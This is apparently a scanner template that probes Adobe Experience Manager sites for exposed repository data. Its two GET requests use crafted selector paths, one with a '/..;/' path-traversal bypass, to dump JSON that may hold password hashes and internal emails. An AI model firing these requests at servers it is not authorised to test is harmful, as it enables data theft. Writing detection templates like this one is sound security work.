id: aem-secrets
name: AEM Secrets - Sensitive Information Disclosure
severity: high
confidence: confirmed
description: Possible Juicy Files can be discovered at this endpoint. Search / Grep for secrets like hashed passwords ( SHA
  ) , internal email disclosure etc.
reference: https://www.linkedin.com/feed/update/urn:li:activity:7066003031271616513/
tags:
- aem
- adobe
- misconfig
- exposure
- vuln
requests:
- method: GET
  path: /content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
  matchers: &id001
  - type: body
    words:
    - '"jcr:uuid"'
    - '"jcr:createdBy"'
    - '"uri"'
  - type: header
    words:
    - application/json
  - type: status
    status:
    - 200
  condition: and
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: en-US,en;q=0.9,hi;q=0.8
- method: GET
  path: /..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
  matchers: *id001
  condition: and
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: en-US,en;q=0.9,hi;q=0.8
